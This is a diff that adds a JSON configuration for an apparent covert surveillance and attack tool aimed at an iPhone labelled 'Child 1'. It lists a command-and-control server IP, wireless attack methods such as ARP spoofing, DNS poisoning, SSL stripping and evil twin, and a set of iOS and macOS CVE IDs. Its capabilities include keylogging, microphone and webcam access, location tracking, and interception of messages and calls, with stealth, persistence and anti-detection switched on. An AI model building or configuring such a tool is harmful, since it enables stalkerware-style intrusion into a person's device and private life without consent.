@@ -1,0 +1,121 @@
+{
+  "timestamp": "2025-08-02T23:20:33.807496",
+  "target_info": {
+    "ip": "192.168.1.100",
+    "mac": "AA:BB:CC:DD:EE:01",
+    "hostname": "iPhone-15-Pro-Max",
+    "os": "iOS 18.6",
+    "user": "Child 1",
+    "device_type": "iPhone"
+  },
+  "network_config": {
+    "gateway_ip": "192.168.1.1",
+    "c2_server_ip": "192.168.1.254",
+    "interface": "en0",
+    "system_info": {
+      "platform": "Linux",
+      "platform_version": "#11 SMP PREEMPT_DYNAMIC Sun Jul  6 04:56:39 UTC 2025",
+      "architecture": "64bit",
+      "processor": "x86_64",
+      "hostname": "cursor",
+      "python_version": "3.13.3"
+    },
+    "available_interfaces": [
+      "en0",
+      "wlan0",
+      "Wi-Fi"
+    ]
+  },
+  "attack_config": {
+    "methods": [
+      "wifi_packet_injection",
+      "arp_spoofing",
+      "dns_poisoning",
+      "ssl_stripping",
+      "deauthentication_attack",
+      "evil_twin_attack",
+      "karma_attack",
+      "beacon_flooding",
+      "probe_request_injection",
+      "eapol_injection"
+    ],
+    "cves": {
+      "ios_18_6": [
+        "CVE-2024-23218",
+        "CVE-2024-23225",
+        "CVE-2024-23222",
+        "CVE-2024-23221",
+        "CVE-2024-23224",
+        "CVE-2024-23223",
+        "CVE-2024-23220",
+        "CVE-2024-23219"
+      ],
+      "macos_14": [
+        "CVE-2024-23230",
+        "CVE-2024-23231",
+        "CVE-2024-23232",
+        "CVE-2024-23233"
+      ]
+    },
+    "remote_access": {
+      "surveillance": [
+        "screen_recording",
+        "screenshot_capture",
+        "webcam_access",
+        "microphone_access",
+        "keylogging",
+        "clipboard_monitoring",
+        "file_system_access",
+        "process_monitoring"
+      ],
+      "tracking": [
+        "gps_location_tracking",
+        "wifi_location_tracking",
+        "bluetooth_tracking",
+        "movement_history",
+        "real_time_location",
+        "geofencing"
+      ],
+      "communication": [
+        "imessage_monitoring",
+        "sms_interception",
+        "call_recording",
+        "facetime_monitoring",
+        "email_interception",
+        "social_media_monitoring",
+        "browser_history",
+        "app_communication_logs"
+      ],
+      "data_extraction": [
+        "contact_list_extraction",
+        "photo_library_access",
+        "calendar_data_mining",
+        "health_data_access",
+        "app_usage_data",
+        "device_settings",
+        "backup_data_access",
+        "icloud_sync_data"
+      ]
+    },
+    "tool_config": {
+      "stealth_mode": true,
+      "persistence": true,
+      "encryption": "AES-256",
+      "compression": true,
+      "obfuscation": true,
+      "anti_detection": true,
+      "auto_cleanup": true,
+      "multi_target": true,
+      "real_time_monitoring": true,
+      "alert_system": true
+    }
+  },
+  "system_info": {
+    "platform": "Linux",
+    "platform_version": "#11 SMP PREEMPT_DYNAMIC Sun Jul  6 04:56:39 UTC 2025",
+    "architecture": "64bit",
+    "processor": "x86_64",
+    "hostname": "cursor",
+    "python_version": "3.13.3"
+  }
+}
